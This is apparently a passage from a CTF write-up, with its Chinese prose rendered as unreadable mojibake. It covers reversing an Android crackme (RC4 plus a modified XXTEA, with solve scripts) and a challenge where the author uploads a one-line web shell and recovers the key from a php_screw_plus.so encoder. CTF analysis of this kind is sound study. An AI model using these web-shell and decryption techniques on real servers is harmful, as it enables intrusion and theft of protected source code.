class="line">    *(_DWORD *)v38 = v37;</span><br><span class="line">    *((_DWORD *)v38 + <span class="number">2</span>) = v24;</span><br><span class="line">    *((_DWORD *)v38 + <span class="number">3</span>) = v27;</span><br><span class="line">    *((_DWORD *)v38 + <span class="number">4</span>) = v25;</span><br><span class="line">    *((_DWORD *)v38 + <span class="number">5</span>) = v31;</span><br><span class="line">    *((_DWORD *)v38 + <span class="number">7</span>) = v29;</span><br><span class="line">    *((_DWORD *)v38 + <span class="number">6</span>) = v33;</span><br><span class="line">    *((_DWORD *)v38 + <span class="number">8</span>) = v21;</span><br><span class="line">    LOBYTE(v5) = <span class="built_in">memcmp</span>(v38, &amp;unk_3440, <span class="number">0x24</span>u) == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å’Œä¹‹å‰çœ‹releaseæ¨¡å¼ç¼–è¯‘çš„800å¤šè¡Œc++ä»£ç æ¯”èµ·æ¥ï¼Œå…¶å®è¿˜å¥½ã€‚å¾ˆæ˜æ˜¾å¼€å§‹ä¸€ä¸ªrc4åŠ å¯†ï¼Œæ¥ç€ä¸€ä¸ªteaï¼Œä»”ç»†çœ‹ä¸‹ï¼Œå¯ä»¥çŸ¥é“æ˜¯xxteaã€‚</p><p>ç„¶åæœ‰å‡ ä¸ªå‡½æ•°ï¼Œçœ‹å¾—å‡ºæ¥æ˜¯åŠ å¯†å‡½æ•°ï¼Œä½†æ²¡æœ‰å¼•ç”¨å…³ç³»ã€‚ä½†è¿™æ ·çœ‹ï¼Œä¸å¥½çœ‹å‡ºè¿™ä¸ªxxteaæ˜¯å¦ç»è¿‡é­”æ”¹ã€‚</p><p>æ‰€ä»¥æˆ‘å†³å®šå»çœ‹ä¸‹armV7çš„soï¼Œç„¶åè°ƒè¯•ä¸€æ³¢ï¼Œæ„Ÿè§‰å‘ç°äº†æ–°å¤©åœ°ï¼Œï¼Œè¿™æ¸…æ™°çš„åŠ å¯†æµç¨‹ã€‚ã€‚ä»è¿™æ‰çŸ¥é“ä¸åŒç‰ˆæœ¬çš„soåç¼–è¯‘ç»“æœå¦‚æ­¤ä¹‹å¤§ï¼Œå…¶å®è¿™ä¸ªarmV7çš„soåº”è¯¥æ‰æ˜¯ä½œè€…è‡ªå·±å†™çš„ï¼Œä»¥åçœ‹soçš„æ—¶å€™åº”è¯¥é¦–å…ˆarmV7çš„soã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> __<span class="function">fastcall <span class="title">Java_come_crack_crackme2_MainActivity_chk</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v5[<span class="number">260</span>]; <span class="comment">// [sp+0h] [bp-118h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = (<span class="keyword">char</span> *)z(a1, a3);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v3) != <span class="number">36</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  z2(v5, (<span class="keyword">unsigned</span> __int8 *)d, <span class="number">0x10</span>u);</span><br><span class="line">  z3(v5, (<span class="keyword">unsigned</span> __int8 *)v3, <span class="number">0x24</span>u);</span><br><span class="line">  z4((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)v3, <span class="number">9u</span>, d);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcmp</span>(v3, &amp;ss, <span class="number">0x24</span>u) == <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢z2ï¼Œz3å°±æ˜¯rc4çš„åˆå§‹åŒ–å’ŒåŠ å¯†ï¼Œçœ‹z4ï¼šç›¸å½“æ¸…æ™°çš„xxteaï¼Œç¡®å®šåªæ˜¯æ”¹äº†delatã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __<span class="function">fastcall <span class="title">z4</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// r9</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// lr</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// r3</span></span><br><span class="line"></span><br><span class="line">  v3 = a2 - <span class="number">1</span>;</span><br><span class="line">  v6 = a1[a2 - <span class="number">1</span>];</span><br><span class="line">  v7 = sub_1258(<span class="number">52</span>) + <span class="number">6</span>;</span><br><span class="line">  result = <span class="number">-1621657930</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v7 &gt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 -= <span class="number">1621657930</span>;</span><br><span class="line">    --v7;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    v11 = (v9 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v3 != v10 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = ((((<span class="number">4</span> * a1[v10 + <span class="number">1</span>]) ^ (v6 &gt;&gt; <span class="number">5</span>)) + ((a1[v10 + <span class="number">1</span>] &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v6))) ^ ((a3[v10 &amp; <span class="number">3</span> ^ v11] ^ v6)</span><br><span class="line">                                                                                  + (a1[v10 + <span class="number">1</span>] ^ v9)))</span><br><span class="line">         + a1[v10];</span><br><span class="line">      a1[v10++] = v6;</span><br><span class="line">    &#125;</span><br><span class="line">    result = (((<span class="number">4</span> * *a1) ^ (v6 &gt;&gt; <span class="number">5</span>)) + ((*a1 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v6))) ^ ((*a1 ^ v9) + (a3[v3 &amp; <span class="number">3</span> ^ v11] ^ v6));</span><br><span class="line">    v6 = result + a1[v3];</span><br><span class="line">    a1[v3] = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰¾å¯†æ–‡ï¼Œç”¨ä¹‹å‰é€†xxteaå†™çš„è„šæœ¬è§£ä¸€ä¸‹ï¼Œç„¶åæ‰¾rc4å¼‚æˆ–åºåˆ—å¼‚æˆ–ä¸€ä¸‹å³å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> len = <span class="number">9</span>; <span class="comment">//é•¿åº¦æ˜¯è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦/4ï¼Œå› ä¸ºåŠ å¯†æ˜¯32ä½ä¸ºä¸€ä¸ªå•ä½</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> delat = <span class="number">0x60A8894A</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key[] = &#123;<span class="number">0x1</span>, <span class="number">0x10</span>, <span class="number">0x100</span>, <span class="number">0x1000</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> enc[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">0x68E5973E</span>, <span class="number">0xC20C7367</span>, <span class="number">0x98AFD41B</span>, <span class="number">0xFE4B9DE2</span>, <span class="number">0x01A5B60B</span>,</span><br><span class="line"><span class="number">0x3D36D646</span>, <span class="number">0xDBCC7BAF</span>, <span class="number">0xA0414F00</span>, <span class="number">0x762CE71A</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">get_sum</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">unsigned</span> <span class="keyword">int</span> delat)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">52</span>/n+<span class="number">6</span>; i++)</span><br><span class="line">sum -= delat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">de_xxtea</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> sum = get_sum(len, delat);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> sum1 = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(sum &gt;&gt; <span class="number">2</span>);</span><br><span class="line">        enc[len<span class="number">-1</span>] -= ((key[((len<span class="number">-1</span>)^sum1)&amp;<span class="number">3</span>]^enc[len<span class="number">-2</span>])+(enc[<span class="number">0</span>]^sum)) ^ (((<span class="number">4</span>*enc[<span class="number">0</span>])^(enc[len<span class="number">-2</span>]&gt;&gt;<span class="number">5</span>))+((<span class="number">16</span>*enc[len<span class="number">-2</span>])^(enc[<span class="number">0</span>]&gt;&gt;<span class="number">3</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i = len<span class="number">-2</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            enc[i] -= ((key[(i^sum1)&amp;<span class="number">3</span>]^enc[i<span class="number">-1</span>])+(enc[i+<span class="number">1</span>]^sum)) ^ (((<span class="number">4</span>*enc[i+<span class="number">1</span>])^(enc[i<span class="number">-1</span>]&gt;&gt;<span class="number">5</span>))+((<span class="number">16</span>*enc[i<span class="number">-1</span>])^(enc[i+<span class="number">1</span>]&gt;&gt;<span class="number">3</span>)));</span><br><span class="line">            i--; </span><br><span class="line">        &#125;<span class="keyword">while</span>(i != <span class="number">0</span>);</span><br><span class="line">        enc[<span class="number">0</span>] -= ((key[(<span class="number">0</span>^sum1)&amp;<span class="number">3</span>]^enc[len<span class="number">-1</span>])+(enc[<span class="number">1</span>]^sum)) ^ (((<span class="number">4</span>*enc[<span class="number">1</span>])^(enc[len<span class="number">-1</span>]&gt;&gt;<span class="number">5</span>))+((<span class="number">16</span>*enc[len<span class="number">-1</span>])^(enc[<span class="number">1</span>]&gt;&gt;<span class="number">3</span>)));</span><br><span class="line"></span><br><span class="line">        sum += delat;</span><br><span class="line">    &#125;<span class="keyword">while</span>(sum != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    de_xxtea();</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>*len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d, "</span>, ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)&amp;enc)[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//86, 4, 176, 212, 156, 99, 77, 48, 150, 206, 192, 5, 147, 190, 59, 130, 82, 75, 22, 178, 138, 51, 183, 77, 109, 123, 153, 80, 194, 177, 12, 18, 225, 132, 10, 147</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = [<span class="number">0x00</span>, <span class="number">0x59</span>, <span class="number">0xE3</span>, <span class="number">0x80</span>, <span class="number">0xD3</span>, <span class="number">0x67</span>, <span class="number">0x42</span>, <span class="number">0x33</span>, <span class="number">0x96</span>, <span class="number">0xC4</span>, <span class="number">0xC6</span>, <span class="number">0x0D</span>, <span class="number">0x94</span>, <span class="number">0xBD</span>, <span class="number">0x6E</span>, <span class="number">0xD2</span>, <span class="number">0x5D</span>, <span class="number">0x18</span>, <span class="number">0x48</span>, <span class="number">0xB3</span>, <span class="number">0x8E</span>, <span class="number">0x32</span>, <span class="number">0xE0</span>, <span class="number">0x46</span>, <span class="number">0x38</span>, <span class="number">0x77</span>, <span class="number">0x9B</span>, <span class="number">0x54</span>, <span class="number">0xCE</span>, <span class="number">0xB0</span>, <span class="number">0x5F</span>, <span class="number">0x19</span>, <span class="number">0xE2</span>, <span class="number">0x81</span>, <span class="number">0x5E</span>, <span class="number">0xD8</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = <span class="string">"012345678901234567890123456789123456"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t</span><br><span class="line"><span class="string">'012345678901234567890123456789123456'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans = [ord(t[i])^s[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans</span><br><span class="line">[<span class="number">48</span>, <span class="number">104</span>, <span class="number">209</span>, <span class="number">179</span>, <span class="number">231</span>, <span class="number">82</span>, <span class="number">116</span>, <span class="number">4</span>, <span class="number">174</span>, <span class="number">253</span>, <span class="number">246</span>, <span class="number">60</span>, <span class="number">166</span>, <span class="number">142</span>, <span class="number">90</span>, <span class="number">231</span>, <span class="number">107</span>, <span class="number">47</span>, <span class="number">112</span>, <span class="number">138</span>, <span class="number">190</span>, <span class="number">3</span>, <span class="number">210</span>, <span class="number">117</span>, <span class="number">12</span>, <span class="number">66</span>, <span class="number">173</span>, <span class="number">99</span>, <span class="number">246</span>, <span class="number">137</span>, <span class="number">110</span>, <span class="number">43</span>, <span class="number">209</span>, <span class="number">181</span>, <span class="number">107</span>, <span class="number">238</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = [<span class="number">86</span>, <span class="number">4</span>, <span class="number">176</span>, <span class="number">212</span>, <span class="number">156</span>, <span class="number">99</span>, <span class="number">77</span>, <span class="number">48</span>, <span class="number">150</span>, <span class="number">206</span>, <span class="number">192</span>, <span class="number">5</span>, <span class="number">147</span>, <span class="number">190</span>, <span class="number">59</span>, <span class="number">130</span>, <span class="number">82</span>, <span class="number">75</span>, <span class="number">22</span>, <span class="number">178</span>, <span class="number">138</span>, <span class="number">51</span>, <span class="number">183</span>, <span class="number">77</span>, <span class="number">109</span>, <span class="number">123</span>, <span class="number">153</span>, <span class="number">80</span>, <span class="number">194</span>, <span class="number">177</span>, <span class="number">12</span>, <span class="number">18</span>, <span class="number">225</span>, <span class="number">132</span>, <span class="number">10</span>, <span class="number">147</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = [ans[i]^e[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag</span><br><span class="line">[<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">49</span>, <span class="number">57</span>, <span class="number">52</span>, <span class="number">56</span>, <span class="number">51</span>, <span class="number">54</span>, <span class="number">57</span>, <span class="number">53</span>, <span class="number">48</span>, <span class="number">97</span>, <span class="number">101</span>, <span class="number">57</span>, <span class="number">100</span>, <span class="number">102</span>, <span class="number">56</span>, <span class="number">52</span>, <span class="number">48</span>, <span class="number">101</span>, <span class="number">56</span>, <span class="number">97</span>, <span class="number">57</span>, <span class="number">52</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">56</span>, <span class="number">98</span>, <span class="number">57</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">97</span>, <span class="number">125</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bytes(flag)</span><br><span class="line"><span class="string">b'flag&#123;194836950ae9df840e8a94348b901a&#125;'</span></span><br></pre></td></tr></table></figure><h3 id="so-get-source"><a href="#so-get-source" class="headerlink" title="so_get_source"></a>so_get_source</h3><p>è¿›å…¥ç½‘ç«™ï¼Œä¸Šä¼ ä¸€ä¸ªä¸€å¥åŒ–æœ¨é©¬æ‹¿åˆ°shellï¼Œç„¶åæŠŠç½‘ç«™æ‰“åŒ…ä¸‹æ¥ã€‚</p><p><img src="/2021/08/01/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20210801094123439.png" alt="image-20210801094123439"></p><p>å‘ç°flag.phpä¸index.phpéƒ½æ˜¯è¢«åŠ å¯†åçš„ï¼Œè€Œè¿™é‡Œæœ‰ä¸€ä¸ªå¯ç–‘çš„php_screw_plus.soæ–‡ä»¶ï¼Œè¿™å’Œé€†å‘å°±æ›´è´´è¿‘äº†ã€‚</p><p>æœç´¢ä¸€ä¸‹php_screw_plus.soï¼Œå‘ç°è¿™ä¸ªå°±æ˜¯å¯¹æˆ‘ä»¬çš„phpæ–‡ä»¶å®ç°åŠ è§£å¯†åŠŸèƒ½çš„æ–‡ä»¶ã€‚</p><p>åˆ°idaä¸­å»æ‰¾åˆ°<strong>pm9screw_ext_fopen</strong>å‡½æ•°ï¼šæ‰“å¼€å¾…åŠ å¯†æˆ–è€…è§£å¯†çš„æ–‡ä»¶ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">FILE *__<span class="function">fastcall <span class="title">pm9screw_ext_fopen</span><span class="params">(FILE *stream)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> __m128i *v1; <span class="comment">// rax</span></span><br><span class="line">  __m128i v2; <span class="comment">// xmm0</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  _OWORD *v6; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// er12</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// cl</span></span><br><span class="line">  FILE *v12; <span class="comment">// rax</span></span><br><span class="line">  FILE *v13; <span class="comment">// rbp</span></span><br><span class="line">  __m128i v15; <span class="comment">// [rsp+0h] [rbp-138h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+1Ch] [rbp-11Ch] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">stat_buf</span>;</span> <span class="comment">// [rsp+20h] [rbp-118h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [rsp+B0h] [rbp-88h] BYREF</span></span><br><span class="line">  __m128i v19; <span class="comment">// [rsp+C0h] [rbp-78h]</span></span><br><span class="line">  __m128i v20; <span class="comment">// [rsp+D0h] [rbp-68h] BYREF</span></span><br><span class="line">  __m128i v21; <span class="comment">// [rsp+E0h] [rbp-58h]</span></span><br><span class="line">  __int128 v22; <span class="comment">// [rsp+F0h] [rbp-48h]</span></span><br><span class="line">  __int128 v23; <span class="comment">// [rsp+100h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v24; <span class="comment">// [rsp+118h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v24 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v20 = <span class="number">0L</span>L;</span><br><span class="line">  v21 = <span class="number">0L</span>L;</span><br><span class="line">  v22 = <span class="number">0L</span>L;</span><br><span class="line">  v23 = <span class="number">0L</span>L;</span><br><span class="line">  v15 = <span class="number">0L</span>L;</span><br><span class="line">  v1 = (<span class="keyword">const</span> __m128i *)md5(<span class="string">"GH65Hws2jedf3fl3MeK"</span>);</span><br><span class="line">  v20 = _mm_loadu_si128(v1);</span><br><span class="line">  v19 = v20;</span><br><span class="line">  v2 = _mm_load_si128(&amp;v15);</span><br><span class="line">  v21 = _mm_loadu_si128(v1 + <span class="number">1</span>);</span><br><span class="line">  *(__m128i *)nptr = v2;</span><br><span class="line">  v3 = fileno(stream);</span><br><span class="line">  __fxstat(<span class="number">1</span>, v3, &amp;stat_buf);</span><br><span class="line">  v16 = stat_buf.st_size;</span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">0x200000</span>uLL);</span><br><span class="line">  v5 = v16;</span><br><span class="line">  *v4 = <span class="number">0L</span>L;</span><br><span class="line">  v6 = v4;</span><br><span class="line">  __fread_chk(v4, <span class="number">0x200000</span>LL, v5, <span class="number">1L</span>L, stream);</span><br><span class="line">  v7 = teg_yek(stream);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="keyword">if</span> ( *(_OWORD *)&amp;v19 == *v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v16;</span><br><span class="line">    <span class="keyword">if</span> ( v16 &gt; <span class="number">16</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="number">16L</span>L;</span><br><span class="line">      v10 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v16 - <span class="number">17</span>) + <span class="number">17L</span>L;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v11 = *((_BYTE *)v6 + v9);</span><br><span class="line">          <span class="keyword">if</span> ( v9 &gt; <span class="number">0x1F</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          *((_BYTE *)&amp;stat_buf.__unused[<span class="number">1</span>] + v9++) = v11;</span><br><span class="line">          <span class="keyword">if</span> ( v10 == v9 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">        &#125;</span><br><span class="line">        *((_BYTE *)v6 + v9++ - <span class="number">32</span>) = v11;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v10 != v9 );</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_7:</span><br><span class="line">    screw_aes(<span class="number">0L</span>L, v6, v8, &amp;v20, &amp;v16, v7, v15.m128i_i64[<span class="number">0</span>], v15.m128i_i64[<span class="number">1</span>]);</span><br><span class="line">    v16 = strtol(nptr, <span class="number">0L</span>L, <span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = tmpfile();</span><br><span class="line">  v13 = v12;</span><br><span class="line">  <span class="keyword">if</span> ( v16 &lt;= <span class="number">0</span> )</span><br><span class="line">    fwrite(<span class="string">"ACCESS DENIED"</span>, <span class="number">0xD</span>uLL, <span class="number">1u</span>LL, v12);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    fwrite(v6, v16, <span class="number">1u</span>LL, v12);</span><br><span class="line">  <span class="built_in">free</span>(v6);</span><br><span class="line">  rewind(v13);</span><br><span class="line">  <span class="keyword">return</span> v13;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éƒ½æœ‰å‡½æ•°åçš„ï¼Œæ‰€ä»¥åˆ†æèµ·æ¥éš¾åº¦ä¸å¤§ï¼Œä¸»è¦å°±æ˜¯ä¸€ä¸ªaes_256_cbcåŠ å¯†ï¼Œæˆ‘ä»¬åªéœ€è¦æ‰¾å¯†é’¥ï¼Œivåœ¨è¿™é‡Œå°±æ˜¯ä¸éœ€è¦çš„ï¼Œå› ä¸ºivçš„é”™è¯¯åªä¼šå½±å“å‰16å­—èŠ‚çš„è§£å¯†ï¼Œæˆ‘ä»¬çŒœæµ‹ç¨‹åºçš„flagæ”¾åœ¨16å­—èŠ‚åï¼Œå› 